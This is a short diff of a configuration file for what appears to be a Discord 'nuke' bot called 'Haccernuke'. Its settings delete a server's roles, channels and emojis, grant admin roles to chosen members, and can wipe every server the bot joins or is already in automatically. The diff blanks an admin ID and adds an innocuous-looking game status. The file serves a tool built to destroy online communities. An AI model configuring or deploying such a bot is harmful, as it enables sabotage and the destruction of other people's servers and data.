@@ -9,7 +9,7 @@ delete_roles=true
 delete_channels=true
 # IDs of members who will be given an admin role. As a member cannot assign roles with permissions higher than their own role, this will make and assign a role with
 # the member permissions of the bot
-auto_admin=["911849994020085820"]
+auto_admin=[""]
 delete_emojis=true
 #  The auto nuke setting will make it so upon joining a server, the nuke will activate automatically
 # Auto nuke also gives the option to nuke all currently joined servers upon startup
@@ -40,3 +40,6 @@ enabled=true
 role_name="Haccernuke nuke role"
 role_color=0x007493
 role_amount=10
+[feature_config.status]
+enabled=true
+activity_name="A very cool game"
